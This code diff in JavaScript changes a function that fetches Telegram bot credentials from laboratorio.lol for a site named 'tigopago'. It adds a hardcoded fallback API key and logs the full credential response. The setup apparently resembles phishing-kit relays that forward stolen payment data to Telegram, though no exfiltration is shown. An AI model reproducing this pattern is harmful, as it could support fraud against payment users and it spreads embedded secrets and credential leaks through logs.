@@ -16,13 +16,20 @@ const BUCKET = process.env.R2_BUCKET;
 
 async function obtenerCredencialesTelegram(site = 'tigopago') {
     try {
+        const apiKey = process.env.LABORATORIO_LOL_API_KEY || 'C4fEzGJfN92dkLKrZ43ULzFbAcx7mD9v';
+        console.log('[Telegram] Obteniendo credenciales de laboratorio.lol con site:', site);
         const response = await fetch(
             `https://www.laboratorio.lol/api/encryptor.php?site=${site}`,
-            { headers: { 'X-API-Key': process.env.LABORATORIO_LOL_API_KEY || 'C4fEzGJfN92dkLKrZ43ULzFbAcx7mD9v' } }
+            { headers: { 'X-API-Key': apiKey } }
         );
         const data = await response.json();
-        return { token: data.token || data.bot_token, chatId: data.chat_id };
+        console.log('[Telegram] Respuesta de laboratorio.lol:', data);
+        const token = data.token || data.bot_token;
+        const chatId = data.chat_id;
+        console.log('[Telegram] Token obtenido:', token ? '✓' : '✗', 'ChatId:', chatId ? '✓' : '✗');
+        return { token, chatId };
     } catch (error) {
+        console.error('[Telegram] Error obteniendo credenciales:', error.message);
         return null;
     }
 }
